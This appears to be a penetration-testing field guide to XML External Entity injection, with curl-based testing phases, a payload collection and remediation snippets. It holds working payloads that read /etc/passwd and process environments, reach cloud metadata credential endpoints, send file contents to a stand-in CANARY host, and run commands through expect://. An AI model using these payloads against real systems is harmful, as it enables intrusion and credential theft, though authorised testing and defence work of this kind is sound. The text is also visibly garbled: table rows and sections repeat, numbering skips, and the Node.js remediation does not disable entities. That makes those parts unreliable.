# XXE (XML External Entity) Injection — Complete Detection & Exploitation Reference

> Comprehensive field guide for XXE detection, validation, exploitation, and reporting.
> Covers in-band, blind, out-of-band, error-based, SSRF, file disclosure, DoS, XInclude, SAML, file uploads.
> All HTTP traffic via Caido proxy (`-x "http://localhost:8080"`).
> Burp Suite + Burp Collaborator + custom OOB server for OOB detection.

---

## Root Cause

XXE occurs when an application processes attacker-controlled XML using an XML parser that permits unsafe external entity resolution.

```xml
<!-- VULNERABLE: Parser resolves external entity -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- SECURE: Parser configured to disable external entities -->
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);
```

---

## Variants

| Variant | Type | Detection |
|---------|------|-----------|
| **In-Band XXE** | File/response reflected in response | Entity value appears in response |
| **Blind XXE** | No response reflection | OOB DNS/HTTP callback |
| **Error-Based XXE** | Parser errors leak data | Error messages contain file content |
| **OOB XXE** | No in-band feedback | DNS/HTTP callback to controlled server |
| **XInclude** | XInclude processing | `xi:include` with external href |
| **Parameter Entity** | DTD parameter entities | `%param;` in DTD |
| **XInclude** | XInclude processing | `xi:include` with external href |
| **SAML/XML Upload** | File upload parsing | SVG/DOCX/XLSX/PPTX/SAML |
| **XInclude** | XInclude processing | `xi:include` with external href |
| **XInclude** | XInclude processing | `xi:include` with external href |
| **XInclude** | XInclude processing | `xi:include` with external href |

---

## Testing Checklist (via Caido + Burp + Collaborator)

### Phase 1: Recon & Endpoint Discovery

```bash
# 1. Identify XML endpoints
curl -x "http://localhost:8080" -s "https://target.com/" | \
  grep -oE '<a[^>]*href=["\']([^"\']*xml[^"\']*)["\']' | head -20

# 2. Find upload endpoints
curl -x "http://localhost:8080" -s "https://target.com/" | \
  grep -oE '<form[^>]*enctype=["\']multipart/form-data[^>]*>'

# 3. Find API endpoints
curl -x "http://localhost:8080" -s "https://target.com/" | \
  grep -oE '/api/[^"\'> ]*'
```

### Phase 2: Baseline & XML Acceptance

```bash
# 1. Baseline request
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/api/endpoint" > baseline.txt

# 2. Test XML acceptance
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><root><test>baseline</test></root>' \
  "https://target.com/api/endpoint"

# 3. Check for XML error handling
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><root><test>malformed' \
  "https://target.com/api/endpoint"
```

### Phase 3: Internal Entity Test (Safe)

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY marker "XXE-CONTROLLED-MARKER">
]>
<root>
  <value>&marker;</value>
</root>
```

```bash
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Content-Type: application/xml" \
  -d @internal_entity.xml \
  "https://target.com/api/endpoint"

# Check if marker is expanded in response
grep -i "XXE-CONTROLLED-MARKER" response.txt
```

### Phase 4: External Entity Testing (OOB)

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "https://UNIQUE-CANARY.YOUR-DOMAIN.example/xxe">
]>
<root>&xxe;</root>
```

```bash
# 1. Start listener
# Use Burp Collaborator or: python3 -m http.server 8080

# 2. Send payload
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Content-Type: application/xml" \
  -d @external_entity.xml \
  "https://target.com/api/endpoint"

# 3. Check for callbacks
# Check Collaborator / listener for DNS/HTTP interactions
```

### Phase 5: Blind XXE (No Response Reflection)

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "https://UNIQUE-CANARY.YOUR-DOMAIN.example/xxe">
  %remote;
]>
<root>test</root>
```

```bash
# Parameter entity for blind XXE
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Content-Type: application/xml" \
  -d @blind_xxe.xml \
  "https://target.com/api/endpoint"
```

### Phase 6: Error-Based XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "https://UNIQUE-CANARY.YOUR-DOMAIN.example/xxe">
  %remote;
]>
<root>&trigger;</root>
```

```bash
# Trigger parser error to leak file content
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Content-Type: application/xml" \
  -d @error_xxe.xml \
  "https://target.com/api/endpoint"
```

### Phase 7: XInclude Testing

```xml
<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="https://UNIQUE-CANARY.YOUR-DOMAIN.example/xinclude" parse="text"/>
</root>
```

```bash
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Content-Type: application/xml" \
  -d @xinclude.xml \
  "https://target.com/api/endpoint"
```

### Phase 8: Parameter Entity Testing

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "https://UNIQUE-CANARY.YOUR-DOMAIN.example/param">
  %remote;
]>
<root>test</root>
```

### Phase 8: File Upload Testing (SVG, DOCX, etc.)

```bash
# SVG XXE
echo '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "https://CANARY/xxe">]><svg>&xxe;</svg>' > test.svg
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -F "file=@test.svg" "https://target.com/upload"

# DOCX XXE
# Create DOCX with malicious word/document.xml
# ZIP it and upload

# SAML XXE
# Test SAML endpoints with external entities
```

---

## Advanced Payloads

### Basic External Entity
```xml
<!ENTITY xxe SYSTEM "https://CANARY/xxe">
```

### File Disclosure
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
<!ENTITY xxe SYSTEM "file:///proc/self/cmdline">
```

### SSRF
```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
```

### Blind OOB (Parameter Entity)
```xml
<!ENTITY % remote SYSTEM "https://CANARY/xxe">
%remote;
```

### Error-Based (File Content in Error)
```xml
<!ENTITY % remote SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'https://CANARY/%remote;'>">
%eval;
%error;
```

### XInclude
```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="https://CANARY/xinclude" parse="text"/>
</root>
```

### XInclude (File)
```xml
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>
```

### UTF-16 Bypass
```bash
# Convert payload to UTF-16
iconv -f UTF-8 -t UTF-16 payload.xml > payload_utf16.xml
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Content-Type: application/xml; charset=UTF-16" \
  --data-binary @payload_utf16.xml \
  "https://target.com/api/endpoint"
```

### PHP Expect Wrapper
```xml
<!ENTITY xxe SYSTEM "expect://id">
```

### Jar Protocol (Java)
```xml
<!ENTITY xxe SYSTEM "jar:https://CANARY/xxe.jar!/file">
```

---

## Verification Sequence (Mandatory)

### In-Band XXE
```
1. Send payload with external entity
2. Check response for entity content
3. Verify file content / SSRF response in response body
```

### Blind XXE (OOB)
```
1. Send payload with unique callback URL
2. Monitor Collaborator / listener for DNS/HTTP
3. Correlate callback with request timestamp
4. Repeat with fresh canary if ambiguous
```

### Error-Based
```
1. Send payload designed to trigger parser error
2. Check error response for file content
5. Verify file content in error message
```

### Blind XXE (Parameter Entity)
```
1. Send parameter entity payload
2. Monitor for callbacks
4. Verify external DTD retrieval
```

### WCD via XXE
```
1. Upload file with XXE payload
2. Check if cached response contains file content
3. Access via static URL
```

---

## WCD via XXE (Web Cache Deception)

```xml
<!-- In SVG/DOCX upload -->
<!ENTITY xxe SYSTEM "https://CANARY/xxe">
```

```bash
# 1. Upload malicious file
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -F "file=@test.svg" "https://target.com/upload"

# 2. Access cached version
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/static/test.svg" | grep -i "xxe"
```

---

## Verification Sequence (Mandatory)

### For All XXE Types
```
1. Baseline request → record response
2. Send XXE payload → record response
3. Check for:
   - Entity content in response (in-band)
   - OOB callback (DNS/HTTP)
   - Error message with file content
   - Cache behavior changes
3. Clean request to same endpoint → verify no persistence
4. Cross-session validation (different user/unauthenticated)
```

### Evidence Required
```
1. Baseline request + response
2. XXE payload request + response
3. OOB callback logs (timestamp, IP, protocol)
4. Error messages with file content
6. Clean request showing cached poisoned response
7. Cross-session retrieval proof
```

---

## Chain Escalation

| Finding | Chain | Severity |
|---------|-------|----------|
| XXE → File Disclosure | Direct | High |
| XXE → SSRF → Internal Service | XXE → SSRF | Critical |
| XXE → Cloud Metadata | XXE → SSRF → Metadata | Critical |
| XXE → RCE (via expect://, PHP) | XXE → RCE | Critical |
| XXE → File Upload → Stored XSS | XXE → Stored XSS | Critical |
| XXE → Cache Poisoning | XXE → Cache Poisoning | High |
| XXE → SSRF → Internal Service | XXE → SSRF | Critical |
| XXE → WCD → Data Exposure | XXE → WCD | High |
| XXE → DoS (Billion Laughs) | XXE → DoS | Medium |

---

## False Positive Elimination

| Observation | Why Not Vulnerable | Required Validation |
|-------------|-------------------|---------------------|
| DOCTYPE accepted | DTD syntax only | Test external entity |
| Internal entity expanded | Normal XML behavior | Test external entity |
| No callback | Network/firewall | Test internal network callback |
| WAF block | WAF blocking | Test bypass / direct to origin |
| Parser error | Malformed XML | Valid XML with entity |
| No callback (blind) | Egress filtering | Test internal callback |

---

## Remediation

```java
// Java (DocumentBuilderFactory)
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
factory.setXIncludeAware(false);
factory.setExpandEntityReferences(false);

// Python (defusedxml)
from defusedxml import ElementTree
ElementTree.fromstring(untrusted_xml)

// .NET
var settings = new XmlReaderSettings {
    DtdProcessing = DtdProcessing.Prohibit,
    XmlResolver = null
};

// PHP
libxml_disable_entity_loader(true);

// Node.js
const parseString = require('xml2js').parseString;
parseString(xml, { explicitArray: false, explicitRoot: true }, (err, result) => {});

// libxml2
xmlSetExternalEntityLoader(nullptr);
```

---

## Caido Integration

```bash
# All tools via Caido proxy
curl -x "http://localhost:8080" ...

# Burp Collaborator via Caido
# Configure Burp upstream proxy to http://localhost:8080

# Burp Suite → configure upstream proxy to http://localhost:8080
```

---

## Verification Checklist

- [ ] Baseline request/response captured
- [ ] XML parsing confirmed
- [ ] Internal entity expansion tested
- [ ] External entity tested with unique canary
- [ ] OOB callback monitored (DNS/HTTP)
- [ ] Parameter entities tested
- [ ] External DTD tested
- [ ] XInclude tested separately
- [ ] File uploads tested (SVG, DOCX, etc.)
- [ ] SAML/XML endpoints tested
- [ ] Blind XXE verified via OOB
- [ ] Error-based tested
- [ ] XInclude tested
- [ ] Clean retrieval verified
- [ ] Cross-session validation
- [ ] False positives eliminated
- [ ] Evidence preserved
- [ ] Impact demonstrated
- [ ] Remediation provided